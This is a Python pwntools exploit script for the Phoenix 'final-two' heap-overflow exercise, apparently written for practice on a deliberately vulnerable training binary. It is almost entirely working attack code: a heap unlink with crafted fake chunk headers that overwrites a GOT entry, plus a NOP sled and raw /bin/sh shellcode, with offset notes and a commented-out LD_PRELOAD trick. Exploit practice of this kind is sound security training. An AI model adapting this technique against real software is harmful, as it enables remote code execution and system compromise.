from pwn import *

arch = "i486"


def pad(s):
    return s+b"A"*(127-len(s))


# 86this element of freelist = 0x0804841c
# -> instruction adr -> segfault
# frist controlled chunk = 0xf7e69000
# last controlled chunk = 0xf7e716f8
io = process(["/opt/phoenix/" + arch + "/"+"final-two"])

# +4 -> skip FSRD
jump_shellcode_adr = pack(0xf7e69008+4, 32)
# start of chunk + 25 to skip jmp shell code, skip overwritten nop slide word,
# hit nop slide in the middle
shell_code_adr = pack(0xf7e69008+25, 32)
# offset used by free impl = +12 hardcoded
# 0x0804c31c
write_got_adr_with_off = pack(0x804c328 - 0xc, 32)

# try filling stack with adr of exploit chunk
# https://cybergibbons.com/security-2/nebula-walkthrough/nebula-exploit-exercises-walkthrough-level11/
# http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/
# export LD_PRELOAD=`python -c 'print "/bin/getflag\x0a"*1000'`
# newline (x0a)
# this might make this challenge solvable, otherwise it isnt

# only 7 bytes big, so the write into the heap at +8 does not bother us
# jump to nop slide and thus shell code skipping written segment
# use shellcraft to build jump asm instruction
jump_shellcode = b"\xB8" + shell_code_adr + b"\xFF\xD0"
jump_shellcode = b"\xCC" * 8

shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
nop_slide = b"\x90"*40

# first_chunk
payload_chunk = b""
payload_chunk += b"FSRD"
# word align shell code for better debugging
payload_chunk += jump_shellcode
# first word of nopslide will be overwritten by free
payload_chunk += nop_slide
payload_chunk += shellcode
payload_chunk = payload_chunk + b"A" * (126 - len(payload_chunk))
# ending / for end of overflow in next chunk
payload_chunk += b"/"

print("first chunk size: " + str(len(payload_chunk)))
write("/tmp/docgil0", payload_chunk)

# second chunk
exploit_chunk = b""
exploit_chunk += b"FSRDROOT/"
# meta 1
exploit_chunk += b"C" * 5
# fake new chunk size = 100, prev in use bit set
exploit_chunk += pack(0x65, 32)
# payload before this is copied, so substract from padding
exploit_chunk += (92-18) * b"D"
# fake next chunks start here
# next next chunks size
# 1111 1100 -> prev in use bit = 0 -> fake next chunks next_in_use bit = 0
exploit_chunk += pack(0xfffffffc, 32)
# fake next chunk size -> -4 so next chunk will be searched 1 word left of this chunk
exploit_chunk += pack(0xfffffffc, 32)
# fd of fake next chunk
exploit_chunk += write_got_adr_with_off
# bk of fake next chunk
exploit_chunk += jump_shellcode_adr
exploit_chunk = exploit_chunk + b"B" * (127 - len(exploit_chunk))

print("second chunk size: " + str(len(exploit_chunk)))
write("/tmp/docgil1", exploit_chunk)

# io.interactive()
# Banner
print(io.recv().decode("utf-8").replace("\\n", "\n"))

for i in range(int(254/2)):
    print("index: " + str(i))
    io.sendline(payload_chunk)
    io.sendline(exploit_chunk)

# almost everything send, breakpoint for gdb here
io.interactive()
# send last chunk
io.sendline(payload_chunk)

# now frees take place
io.interactive()
